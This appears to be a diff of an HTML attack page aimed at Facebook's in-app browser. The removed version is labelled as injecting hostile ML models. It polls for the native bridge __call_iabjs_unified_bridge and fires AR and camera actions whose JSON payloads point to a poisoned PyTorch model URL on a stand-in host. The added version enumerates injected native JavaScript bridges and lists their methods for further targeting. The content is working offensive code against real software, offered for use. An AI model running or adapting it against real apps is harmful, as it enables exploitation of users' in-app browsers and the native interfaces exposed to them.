@@ -2,57 +2,93 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Spark AR / PyTorch ACE</title>
+    <title>JSI Bridge Enumerator</title>
+    <style>
+        body { background:#000; color:#0f0; font-family:monospace; font-size: 12px; word-wrap: break-word; }
+        .bridge { color: #f0f; font-weight: bold; margin-top: 10px; }
+        .method { color: #fff; margin-left: 15px; }
+    </style>
 </head>
-<body style="background:#000; color:#ff0; font-family:monospace;">
-    <h3>Injecting Hostile ML Models...</h3>
-    <div id="log">Awaiting bridge...</div>
+<body>
+    <h3>Scanning for Injected Native Bridges...</h3>
+    <div id="results">Scanning...<br></div>
 
     <script>
-        const logEl = document.getElementById('log');
-        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
+        const resultsEl = document.getElementById('results');
+        
+        function scanBridges() {
+            let output = "";
+            let fbSpecificBridges = [];
+            let unknownObjects = [];
 
-        // A URL pointing to what Facebook thinks is a valid AR effect or PyTorch model.
-        // In a real exploit, this would host the malicious serialized .pte file.
-        const poisonModelUri = "https://example.com/exploit_model.pte";
+            // 1. Get every single property attached to the global window
+            let props = Object.getOwnPropertyNames(window);
 
-        // Spark AR / Camera Bridge Actions
-        const arActions = [
-            "open_camera", 
-            "apply_ar_effect", 
-            "load_effect",
-            "prefetch_ar_asset",
-            "start_camera_effect"
-        ];
+            for (let i = 0; i < props.length; i++) {
+                let propName = props[i];
+                
+                // Skip standard browser objects to reduce noise
+                if (propName === 'window' || propName === 'document' || propName === 'location' || propName === 'chrome') continue;
 
-        function fireMLPoisoner() {
-            let bridge = window.__call_iabjs_unified_bridge;
-            logEl.innerHTML += "<br>[*] Bridge acquired. Firing ML payloads...";
-
-            for (let action of arActions) {
-                // We wrap the URI in various JSON schemas the AR bridge expects
-                let payloads = [
-                    JSON.stringify({ effect_id: "12345", effect_uri: poisonModelUri }),
-                    JSON.stringify({ model_url: poisonModelUri }),
-                    JSON.stringify({ asset_uri: poisonModelUri, type: "pytorch" }),
-                    JSON.stringify({ url: poisonModelUri, is_ar: true })
-                ];
-
-                for (let payload of payloads) {
-                    try {
-                        bridge(action, uuid, payload);
-                    } catch(e) {}
+                try {
+                    let val = window[propName];
+                    
+                    // Native Android JavascriptInterfaces show up as objects
+                    if (typeof val === 'object' && val !== null) {
+                        let strRep = String(val);
+                        
+                        // Filter out standard HTML elements, keep potential Java objects
+                        if (!strRep.includes("HTML") && !strRep.includes("Window")) {
+                            
+                            // Flag obvious Facebook/Meta targets
+                            if (propName.toLowerCase().includes('fb') || 
+                                propName.toLowerCase().includes('messenger') ||
+                                propName.toLowerCase().includes('iab')) {
+                                fbSpecificBridges.push(propName);
+                            } else {
+                                unknownObjects.push(propName);
+                            }
+                        }
+                    }
+                    
+                    // Sometimes bridges are injected as direct functions
+                    if (typeof val === 'function' && 
+                       (propName.toLowerCase().includes('fb') || propName.startsWith('_'))) {
+                        fbSpecificBridges.push(propName + " (Function)");
+                    }
+                } catch(e) {
+                    // Security errors often occur when touching restricted native objects!
+                    output += `<span style="color:red">[!] Access Denied to: ${propName}</span><br>`;
                 }
             }
-            logEl.innerHTML += "<br><span style='color:red;'>[*] Poison injected. Watch logs for ModelLoader.</span>";
+
+            output += "<br><b>--- FACEBOOK/IAB BRIDGES ---</b><br>";
+            if (fbSpecificBridges.length === 0) output += "None found.<br>";
+            
+            fbSpecificBridges.forEach(bridgeName => {
+                output += `<div class="bridge">${bridgeName}</div>`;
+                
+                // Attempt to reflect methods off the object
+                try {
+                    let obj = window[bridgeName.replace(" (Function)", "")];
+                    if (typeof obj === 'object') {
+                        for (let method in obj) {
+                            output += `<div class="method">.${method}()</div>`;
+                        }
+                    }
+                } catch(e) {}
+            });
+
+            output += "<br><b>--- OTHER SUSPICIOUS OBJECTS ---</b><br>";
+            unknownObjects.forEach(objName => {
+                output += `<div class="method">${objName}</div>`;
+            });
+
+            resultsEl.innerHTML = output;
         }
 
-        let check = setInterval(() => {
-            if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                clearInterval(check);
-                fireMLPoisoner();
-            }
-        }, 100);
+        // Wait a second for Facebook to finish injecting all Java objects, then scan
+        setTimeout(scanBridges, 1500);
     </script>
 </body>
 </html>
